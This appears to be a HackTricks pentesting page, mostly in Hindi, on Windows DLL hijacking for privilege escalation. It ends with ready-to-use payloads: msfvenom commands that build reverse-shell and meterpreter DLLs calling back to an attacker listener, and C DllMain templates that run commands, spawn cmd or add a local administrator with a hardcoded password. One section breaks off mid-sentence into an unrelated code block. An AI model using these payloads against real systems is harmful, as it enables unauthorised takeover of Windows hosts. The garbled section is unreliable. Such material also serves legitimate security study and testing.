# Dll Hijacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में शामिल हों** या [**telegram समूह**](https://t.me/peass) या **Twitter पर** मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके**.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अभेद्य को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_धाराप्रवाह पोलिश लिखित और बोली जाने वाली आवश्यक_).

{% embed url="https://www.stmcyber.com/careers" %}

## परिभाषा

सबसे पहले, परिभाषा को स्पष्ट कर दें। DLL हाइजैकिंग, सबसे व्यापक अर्थ में, **एक वैध/विश्वसनीय एप्लिकेशन को किसी मनमाने DLL को लोड करने के लिए चालाकी से प्रेरित करना है**। _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ और _DLL Side-Loading_ जैसे शब्द अक्सर -गलती से- एक ही बात कहने के लिए इस्तेमाल किए जाते हैं।

Dll हाइजैकिंग का उपयोग **कोड निष्पादित** करने, **स्थायित्व प्राप्त** करने और **अधिकार बढ़ाने** के लिए किया जा सकता है। इन तीनों में से **सबसे कम संभावना** **अधिकार बढ़ाने** की है। हालांकि, चूंकि यह अधिकार बढ़ाने के खंड का हिस्सा है, मैं इस विकल्प पर ध्यान केंद्रित करूंगा। यह भी ध्यान दें कि लक्ष्य के बावजूद, एक dll हाइजैकिंग एक ही तरीके से की जाती है।

### प्रकार

चुनने के लिए **विविध दृष्टिकोण** हैं, सफलता इस पर निर्भर करती है कि एप्लिकेशन अपने आवश्यक DLLs को लोड करने के लिए कैसे कॉन्फ़िगर किया गया है। संभावित दृष्टिकोणों में शामिल हैं:

1. **DLL प्रतिस्थापन**: एक वैध DLL को एक दुष्ट DLL से बदलें। इसे _DLL प्रॉक्सींग_ के साथ संयोजित किया जा सकता है, जो सुनिश्चित करता है कि मूल DLL की सभी कार्यक्षमता बरकरार रहे।
2. **DLL खोज क्रम हाइजैकिंग**: एक एप्लिकेशन द्वारा निर्दिष्ट DLLs बिना पथ के एक निश्चित क्रम में निश्चित स्थानों में खोजे जाते हैं। खोज क्रम को हाइजैक करना दुष्ट DLL को उस स्थान पर रखकर होता है जो वास्तविक DLL से पहले खोजा जाता है। कभी-कभी इसमें लक्षित एप्लिकेशन की कार्य निर्देशिका शामिल होती है।
3. **फैंटम DLL हाइजैकिंग**: एक दुष्ट DLL को एक लापता/अस्तित्वहीन DLL के स्थान पर डालें जिसे एक वैध एप्लिकेशन लोड करने की कोशिश करता है।
4. **DLL पुनर्निर्देशन**: DLL की खोज किए जाने वाले स्थान को बदलें, उदाहरण के लिए `%PATH%` पर्यावरण चर को संपादित करके, या `.exe.manifest` / `.exe.local` फ़ाइलों को शामिल करके जिसमें दुष्ट DLL वाला फ़ोल्डर होता है।
5. **WinSxS DLL प्रतिस्थापन**: लक्षित DLL के प्रासंगिक WinSxS फ़ोल्डर में वैध DLL को दुष्ट DLL से बदलें। अक्सर इसे DLL साइड-लोडिंग के रूप में संदर्भित किया जाता है।
6. **सापेक्ष पथ DLL हाइजैकिंग:** वैध एप्लिकेशन की प्रतिलिपि बनाएँ (और वैकल्पिक रूप से नाम बदलें) एक उपयोगकर्ता-लिखने योग्य फ़ोल्डर में, दुष्ट DLL के साथ। इसका उपयोग किस तरह से किया जाता है, इसमें (Signed) Binary Proxy Execution के साथ समानताएं हैं। इसका एक विविधता (कुछ हद तक विरोधाभासी रूप से कहा जाता है) 'अपना खुद का LOLbin लाओ' में जिसमें वैध एप्लिकेशन को दुष्ट DLL के साथ लाया जाता है (बजाय वैध स्थान से प्रतिलिपि बनाने के)।

## गायब Dlls खोजना

सिस्टम के अंदर गायब Dlls खोजने का सबसे आम तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना है, **निम्नलिखित 2 फिल्टर सेट करें**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

और केवल **File System Activity** दिखाएँ:

![](<../../.gitbook/assets/image (314).png>)

यदि आप **सामान्य रूप से गायब dlls की खोज कर रहे हैं** तो आप इसे कुछ **सेकंड के लिए चलाए रखें**।\
यदि आप किसी **विशिष्ट एक्जीक्यूटेबल के अंदर गायब dll की खोज कर रहे हैं** तो आपको **"Process Name" "contains" "\<exec name>" जैसे एक और फिल्टर सेट करना चाहिए, इसे निष्पादित करें, और घटनाओं को कैप्चर करना बंद कर दें**।

## गायब Dlls का शोषण करना

अधिकार बढ़ाने के लिए, हमारे पास सबसे अच्छा मौका यह है कि हम एक dll लिख सकें जिसे एक विशेषाधिकार प्रक्रिया किसी ऐसे **स्थान पर लोड करने की कोशिश करेगी** जहां यह **खोजा जाने वाला है**। इसलिए, हम एक dll को एक **फ़ोल्डर** में **लिख** सकेंगे जहां **dll को मूल dll** के फ़ोल्डर से पहले **खोजा जाता है** (अजीब मामला), या हम उस **फ़ोल्डर में लिख सकेंगे जहां dll को खोजा जाने वाला है** और मूल **dll किसी भी फ़ोल्डर में मौजूद नहीं है**।

### Dll खोज क्रम

**Microsoft दस्तावेज़ीकरण के अंदर** आप विशेष रूप से देख सकते हैं कि Dlls कैसे लोड किए जाते हैं।

सामान्य तौर पर, एक **Windows एप्लिकेशन** DLLs खोजने के लिए **पूर्व-न
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फोल्डर्स की अनुमतियाँ जांचें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप एक executable के imports और एक dll के exports की जांच भी कर सकते हैं:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
पूरी गाइड के लिए कि कैसे **Dll Hijacking का दुरुपयोग करके अधिकारों को बढ़ाया जाए** जब आपको **System Path फोल्डर** में लिखने की अनुमति हो, देखें:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### स्वचालित उपकरण

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) जांच करेगा कि क्या आपके पास system PATH के अंदर किसी भी फोल्डर में लिखने की अनुमति है।\
इस भेद्यता को खोजने के लिए अन्य रोचक स्वचालित उपकरण **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आपको एक शोषण योग्य परिदृश्य मिलता है तो इसे सफलतापूर्वक शोषित करने के लिए सबसे महत्वपूर्ण बातों में से एक होगा **एक dll बनाना जो कम से कम सभी फंक्शन्स को निर्यात करता है जो एक्जीक्यूटेबल इससे इम्पोर्ट करेगा**। वैसे, ध्यान दें कि Dll Hijacking [Medium Integrity level से High **(UAC को बायपास करते हुए)**](../authentication-credentials-uac-and-efs.md#uac) या [**High Integrity से SYSTEM**](./#from-high-integrity-to-system)** तक बढ़ाने के लिए काम आता है।** आप **वैध dll बनाने का उदाहरण** इस dll hijacking अध्ययन में पा सकते हैं जो dll hijacking को निष्पादन के लिए केंद्रित करता है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**।**\
इसके अलावा, **अगले खंड** में आप कुछ **बेसिक dll कोड्स** पा सकते हैं जो **टेम्प्लेट्स** के रूप में या **आवश्यक नहीं होने वाले फंक्शन्स के साथ dll बनाने के लिए उपयोगी हो सकते हैं।**

## **Dlls बनाना और कंपाइल करना**

### **Dll Proxifying**

मूल रूप से एक **Dll proxy** एक Dll होता है जो **आपके दुर्भावनापूर्ण कोड को लोड होने पर निष्पादित करने में सक्षम होता है** लेकिन साथ ही **अपेक्षित** के अनुसार **काम करने** और **प्रदर्शित करने** में भी सक्षम होता है **सभी कॉल्स को वास्तविक लाइब्रेरी को रिले करके**।

उपकरण [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) के साथ आप वास्तव में **एक एक्जीक्यूटेबल को इंगित कर सकते हैं और लाइब्रेरी चुन सकते हैं** जिसे आप प्रॉक्सिफाई करना चाहते हैं और **प्रॉक्सिफाइड dll जनरेट कर सकते हैं** या **Dll को इंगित करके प्रॉक्सिफाइड dll जनरेट कर सकते हैं**।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**मीटरप्रीटर (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**यूजर बनाएं (x86 मैंने x64 संस्करण नहीं देखा):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### आपका अपना

ध्यान दें कि कई मामलों में आपके द्वारा संकलित Dll को **कई फ़ंक्शन्स निर्यात करने चाहिए** जो पीड़ित प्रक्रिया द्वारा लोड किए जाने वाले हैं, यदि ये फ़ंक्शन्स मौजूद नहीं हैं तो **बाइनरी उन्हें लोड नहीं कर पाएगी** और **एक्सप्लॉइट विफल हो जाएगा**।
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
```markdown
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अभेद्य को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_धाराप्रवाह पोलिश लिखित और बोली जाने वाली आवश्यकता_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.**

</details>
```
